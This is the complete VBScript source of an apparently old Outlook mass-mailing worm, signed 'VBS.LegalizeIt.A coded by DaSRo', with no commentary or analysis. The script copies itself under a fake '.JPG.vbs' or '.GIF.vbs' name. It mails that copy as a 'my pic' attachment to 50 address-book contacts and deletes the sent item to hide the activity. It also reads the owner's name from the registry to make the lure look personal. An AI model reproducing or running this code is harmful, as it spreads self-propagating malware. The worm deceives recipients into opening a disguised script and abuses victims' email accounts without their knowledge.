   'VBS.LegalizeIt.A coded by DaSRo
   'Outlook-Worm

   On Error Resume Next
   Dim fn,random,user,x,y,z
   user=CreateObject("WScript.Shell").RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
   random=Int((2 * Rnd) + 1)
   Select Case random
    Case "1" z=".JPG.vbs"
    Case "2" z=".GIF.vbs"
   End Select
   fn=user&z
   CreateObject("Scripting.FileSystemObject").GetFile(WScript.ScriptFullName).Copy("C:\"&fn)
   Set ol=CreateObject("Outlook.Application")
   Set ml=ol.CreateItem(0)
   For x=1 To 50
   ml.bcc=ml.bcc&";"&ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
   Next
   ml.Subject="my pic"
   ml.Body="Here is my pic ..."&chr(13)&"c ya soon in the chat - "&user&chr(13)&chr(13)&"LEGALIZE IT!"
   ml.Attachments.Add("C:\"&fn)
   ml.DeleteAfterSubmit=True
   ml.Send
   ol.Quit
   If Day(Now())=Hour(Now()) Or Minute(Now())=Second(Now()) Then
    MsgBox "Legalize it!",4096,""
   End If
